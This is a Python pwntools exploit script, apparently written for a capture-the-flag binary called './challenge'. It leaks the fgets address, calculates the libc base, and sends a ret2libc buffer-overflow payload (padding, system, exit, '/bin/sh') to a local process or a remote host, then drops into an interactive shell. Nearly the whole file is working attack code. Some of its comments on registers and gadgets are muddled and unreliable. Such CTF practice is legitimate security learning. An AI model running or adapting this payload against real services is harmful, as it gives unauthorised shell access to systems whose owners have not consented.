from pwn import *
import sys

# Buffer size is not 16 on the server
# info(SHELL_CODE_LEN)

# 0x08049243
# `int mprotect(addr[.size],    size,            protection);`
# registers:      RDI ,         RSX,        ,     RDI

# PROT_READ = 4
# PROT_WRITE = 2
# PROT_EXEC = 1
# protection = 0x7

# dl_pagesize = (little endian): 0x00 10 00 00 00 00 00 00
#             = 0x 00 00 00 00 00 00 10 00
#             = 4096 bytes

# __libc_stack_end = 0x0049fa38
# puts = 0x0040a780

# 0x0000000000402081 : pop rdi ; ret
OFFSET = 16 + 4

fuzz = OFFSET * b"A"
# if args.GDB:
#     fuzz = (
#         b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa"
#     )
# else:
#     fuzz = OFFSET * b"A"


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# GDB script
gdb_script = """
break 25
b *0x08049243
continue
"""

# Prepare program
exe = "./challenge"
context.binary = binary = ELF(exe, checksec=True)
context.log_level = "DEBUG"

# retToMain 0x0040174b
# libc base 0xf7d65000
# system offset 00052220
# fgets offset 0007a1e0
# rdi_ret = p32(, "little")
# 1c6e52
# libc_stack_end = p32(binary.symbols.get("__libc_stack_end"))
# main_addr = p32(binary.symbols.get("main"))
# puts_addr = p32(binary.symbols.get("_IO_puts"))

# libcBase = 0xF7D65000
# system = libcBase + 0x00052220
# binsh = libcBase + 0x001C6E52
# fgets = libcBase + 0x0007A1E0


def run_func(fuzz, start):
    fgetsOffset = 0x0007A1E0
    io = start()
    io.recvline()
    fgetsAddrStr: str = io.recvline().strip()
    libcBase = int(fgetsAddrStr, 16) - fgetsOffset

    system = p32(libcBase + 0x00052220, "little")
    binsh = p32(libcBase + 0x001C6E52, "little")
    popEdi = p32(libcBase + 0x000254D4, "little")
    exit1 = p32(libcBase + 0x0003EAD0, "little")

    info("libc base addr: " + hex((libcBase)))
    info("popEDI addr: " + hex(u32(popEdi, "little")))
    info("/bin/sh addr: " + hex(u32(binsh, "little")))
    info("system addr: " + hex(u32(system, "little")))
    info("exit1: " + hex(u32(exit1, "little")))

    info(fgetsAddrStr)
    # fgetAddr: bytes = p32(fgetsAddrInt, "little")

    payload = b""
    payload += fuzz
    payload += system
    payload += exit1
    # payload += popEdi
    payload += binsh
    # NOTE: THIS ORDER OF COMMENTING IT OUT WORKS!

    write("payload.txt", payload)

    io.sendline(payload)
    io.interactive()


# for i in range(0, 50):
run_func(fuzz, start)
